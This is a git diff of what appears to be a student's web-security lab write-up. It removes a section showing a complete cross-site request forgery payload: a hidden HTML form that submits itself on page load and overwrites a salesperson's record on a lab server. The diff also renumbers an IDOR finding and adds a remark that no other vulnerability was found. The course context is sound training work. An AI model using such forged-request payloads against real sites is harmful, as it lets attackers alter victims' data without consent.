@@ -63,27 +63,7 @@ Each color is vulnerable to only 2 of the 6 possible exploits. First discover wh
 
 ## Red
 
-- [ ] Vulnerability #1: Cross-Site Request Forgery (CSRF)
-
-* I created a HTMP form using https://www.w3schools.com/tags/att_a_download.asp using this code:
-```
-<html>
-  <head>
-    <title>NOT A FAKE FORM</title>
-  </head>
-  <body onload="document.my_form.submit()">
-    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
-      <input type="text" name="first_name" value="TROLLEDDDD" />
-      <input type="text" name="last_name" value="SORRY_Mr.Barker" />
-      <input type="text" name="phone" value="777-777-7777" />
-      <input type="text" name="email" value="TROLLED@TORLLED.COM" />
-    </form>
-    <iframe name="hidden_results" style="display: none;"></iframe>
-  </body>
-</html>
-
-```
-- [ ] Vulnerability #2: Insecure Direct Object Reference (IDOR)
+- [ ] Vulnerability #1: Insecure Direct Object Reference (IDOR)
 
 * Above GIF show an attacker getting access to the hidden user's accounts that the attacker is not permitted to view.
 * This is done through modifying the "id" parameter in the URL's to change the GET request.
@@ -117,3 +97,4 @@ Each color is vulnerable to only 2 of the 6 possible exploits. First discover wh
 
 - [ ] Red
 
+* I could find any other vulnerabilitie for this wesite. I was triying to wrake my brains around what I could use with out repeating any of the others, but noting came to mind. If there was I'm just don't have the knowledge of it.
